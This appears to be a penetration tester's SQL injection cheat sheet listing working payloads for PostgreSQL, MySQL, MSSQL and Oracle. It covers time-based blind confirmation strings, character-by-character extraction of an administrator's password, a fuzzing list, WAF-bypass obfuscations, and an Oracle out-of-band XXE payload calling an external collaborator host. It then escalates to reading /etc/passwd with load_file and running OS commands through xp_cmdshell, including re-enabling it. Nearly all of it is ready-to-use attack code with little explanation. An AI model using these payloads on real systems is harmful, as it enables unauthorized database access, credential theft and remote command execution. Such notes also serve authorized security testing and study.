Automation Tool: [[SQLMap]]

***Detection***
 - [ ] Identify where would information be retrieve from data store
 - [ ] Identify data type of input data
 - [ ] Identify possible injection operators
 - [ ] Construct potential SQL statement

Confirming Blind SQLi
- Oracle need to be confirmed using OOB techniques or SQLMap directly.
```sql
-- PostgreSQL
'||(select+case+when+(1=0)+then+pg_sleep(8)+else+pg_sleep(-1)+end)||'
'||(select+case+when+(1=1)+then+pg_sleep(8)+else+pg_sleep(-1)+end)||'

-- MySQL & MariaDB
'+(select if(1=1, sleep(10), 'a')+'
'+(select if(1=0, sleep(10), 'a')+'

-- Microsoft
'+(if (1=1) waitfor delay '0:0:10')+'
'+(if (1=0) waitfor delay '0:0:10')+'

-- Oracle
'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)||'
'||(SELECT CASE WHEN (1=0) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)||'
```
Blind Exfiltration
```sql
-- Enumerate password length

'||(select+case+when+(username='administrator'+and+LENGTH(password)>20)+then+pg_sleep(8)+else+pg_sleep(-1)+from+users+end)||'

-- Password
'||(select+case+when+(username='administrator'+and+SUBSTRING(password,1,1)='a')+then+pg_sleep(8)+else+pg_sleep(-1)+from+users+end)||'

'||(select+case+when+(username='administrator'+and+SUBSTRING(password,3,1)='z')+then+pg_sleep(8)+else+pg_sleep(-1)+from+users+end)||'
```
Detection FuZZ
```python
# MySQL & MariaDB
id # column name 
''
""
'+'
"+"
' '
" "
'%20'
"%20"
'%2b'
"%2b"
` # column name injection
``
)
(
()
% # Verify that database is being called (% retrieve all)
\
\\
'\
'\'
&
'&'
"&"
/*
#
;
%3b
//
foo'+'bar
CONCAT('foo','bar')
'-sleep(3)-'
'+sleep(3)+'
"-sleep(3)-"
"+sleep(3)+"
2#
2-- -
2--
(2+1) # Integer Data
(2%2b1)
(2-1)
2+1
2%2b1
2-1
67-ACII('A')
51-ASCII(1)

# SQLite


# PostgreSQL
'||'
"||"
'foo'||'bar'
foo'||'bar
'||pg_sleep(3)||'
"||pg_sleep(3)||"

# Oracle
'||'
"||"
'foo'||'bar'
'||(select+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+rdswv+SYSTEM+"http%3a//if1j93mn00dej9djr7oducx9x03rrhf6.oastify.com">%25rdswv%3b]>'),'/l')+from+dual)||'


# MSSQL
'+'
"+"
WAITFOR DELAY '0:00:03'

```
***WAF Bypasses***
- [ ] WAFW00F reveals WAF
```sql
SeLeCt
SELECT
sElEcT
Select
select
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
SELECT/**/username,password/**/FROM/**/users
SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
SEL/*foo*/ECT username,password FR/*foo*/OM users # MySQL
```

***Escalating the Attack***
MySQL Read Files (require FILE_PRIV)
```sql
select load_file('/etc/passwd')
```
MSSQL RCE
```sql
master..xp_cmdshell 'ipconfig > foo.txt'
exec xp_cmdshell 'dir'
```
- Re-enabling xp_cmdshell (sp_configure)
```sql
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell', '1'
RECONFIGURE WITH OVERRIDE
```